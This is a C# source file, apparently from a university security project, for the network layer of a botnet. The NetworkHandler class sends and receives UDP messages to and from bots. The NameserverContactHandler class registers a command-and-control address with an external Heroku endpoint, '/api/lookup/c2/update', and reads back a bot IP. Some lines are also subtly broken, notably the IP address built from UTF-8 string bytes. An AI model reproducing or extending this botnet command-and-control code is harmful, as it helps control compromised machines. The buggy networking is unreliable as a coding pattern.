using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Coms4507_Project.BotHandling
{
    internal class NetworkHandler
    {
        private readonly UdpClient udpClient;
        private readonly int portNumber = 45920;
        private IPEndPoint endpoint;
        private string publicIp;
        private NameserverContactHandler nameserverContactor;

        public NetworkHandler(string ip)
        {
            publicIp = ip;
            udpClient = new UdpClient(portNumber);
            endpoint = new IPEndPoint(IPAddress.Any, portNumber);
            nameserverContactor = new NameserverContactHandler(ip);

            // Now we go ahead and try to contact the nameserver for bots.
        }

        public void SendMessage(string message, string addr)
        {
            IPEndPoint client = new IPEndPoint(new IPAddress(Encoding.UTF8.GetBytes(addr)), portNumber);
            byte[] dataB = Encoding.UTF8.GetBytes(message);
            _ = udpClient.Send(dataB, dataB.Length, client);
        }

        public string WaitForMessage()
        {
            byte[] dataB = udpClient.Receive(ref endpoint); // This is blocking.
            string data = Encoding.UTF8.GetString(dataB);
            return data;
        }

    }


    // =========================== [ NAMESERVER INTERACTIONS ARE DONE HERE ] ===========================

    internal class NameserverContactHandler
    {
        private readonly HttpClient httpClient;
        private string webserverIp = "https://athena-nameserver.herokuapp.com";
        private string ip;
        public NameserverContactHandler(string ip)
        {
            this.ip = ip;
            httpClient = new HttpClient();
            Dictionary<string, string> dict = new Dictionary<string, string>
            {
                { "ip", ip },
                { "port", Convert.ToString(25565) }
            };
            JObject firstContact = new JObject(dict);
            Task<HttpResponseMessage> response = httpClient.PostAsync(webserverIp + "/api/lookup/c2/update", new StringContent(firstContact.ToString()));
            response.Wait();
            string botIP = response.Result.Content.ReadAsStringAsync().Result;
            Trace.WriteLine("Bot IP: ", botIP);
        }

    }
}
